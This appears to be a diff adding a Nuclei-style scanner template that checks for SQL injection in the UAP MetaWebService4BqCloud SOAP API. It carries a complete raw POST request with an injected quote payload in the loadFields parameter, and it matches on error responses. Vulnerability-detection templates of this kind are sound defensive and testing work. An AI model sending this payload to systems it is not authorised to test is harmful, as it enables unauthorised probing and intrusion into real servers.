@@ -1,0 +1,47 @@
+id: uap-metawebservice-sqli
+
+info:
+  name: UAP MetaWebService SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects potential SQL injection vulnerability in UAP MetaWebService4BqCloud SOAP API.
+  tags: sqli, soap
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=09133CFE3A7B0CE8341AB1A7DEDFCCDE.server
+        Connection: keep-alive
+        SOAPAction: urn:loadFields
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 350
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <imet:loadFields>
+                 <!--type: string-->
+                 <imet:string>SmartModel^1';*</imet:string>
+              </imet:loadFields>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "syntax error"
+          - "SQL"
+          - "Exception"
+        part: body
